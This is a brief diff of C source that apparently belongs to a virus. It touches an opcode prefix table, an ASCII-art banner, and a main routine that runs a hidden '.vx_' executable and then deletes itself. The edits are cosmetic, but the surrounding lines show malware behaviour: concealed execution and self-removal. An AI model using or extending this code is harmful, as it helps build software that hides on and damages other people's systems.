@@ -15,7 +15,7 @@ static const unsigned char prefixes[] = { ADD, AND, XOR, OR, SBB, SUB, JMP, JE, 
 static const char *_art =
     "  / \\_/ \\ \n"
     " (  o.o  )\n"
-    "  > ^ <   \n";
+    "   > ^ <   \n";
 
 static int wr_in(unsigned reg, int offset, int space)
 {
@@ -310,6 +310,6 @@ int main(int argc, char* argv[])
     }
     // Execute the original, hidden executable
     exec("./.vx_%s", Vx);
-    SelfDelete(argv[0]);
+    SelfDelete(argv[0]); // or remove ))
     return 0;
 }
